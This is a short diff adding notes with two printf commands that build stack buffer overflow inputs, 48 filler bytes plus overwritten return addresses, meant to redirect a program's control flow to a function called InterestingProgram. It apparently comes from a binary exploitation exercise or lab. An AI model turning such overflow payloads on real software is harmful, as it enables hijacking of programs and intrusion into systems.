@@ -1,0 +1,6 @@
+Choose an invalid path and get corrupted
+printf "111111111111111111111111111111111111111111111111\x40\x1a\x40\x00\x00\x00\x00\x00" > input
+
+Abuse stack trace to work with a valid path (main->InterestingProgram)
+printf "111111111111111111111111111111111111111111111111\x40\x1a\x40\x00\x00\x00\x00\x00\x00\x1b\x51" > input
+
